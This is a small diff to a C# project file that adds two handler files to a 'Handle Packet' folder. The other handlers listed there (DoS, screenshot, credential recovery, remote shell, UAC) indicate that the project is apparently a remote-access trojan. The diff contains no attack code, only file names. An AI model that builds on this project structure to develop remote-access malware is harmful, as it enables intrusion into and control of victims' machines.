@@ -85,7 +85,9 @@
     <Compile Include="Handle Packet\HandleDos.cs" />
     <Compile Include="Handle Packet\HandleFileManager.cs" />
     <Compile Include="Handle Packet\HandleGetScreenShot.cs" />
+    <Compile Include="Handle Packet\HandlePcOptions.cs" />
     <Compile Include="Handle Packet\HandlerChat.cs" />
+    <Compile Include="Handle Packet\HandleReportWindow.cs" />
     <Compile Include="Handle Packet\HandlerRecovery.cs" />
     <Compile Include="Handle Packet\HandleShell.cs" />
     <Compile Include="Handle Packet\HandleUAC.cs" />
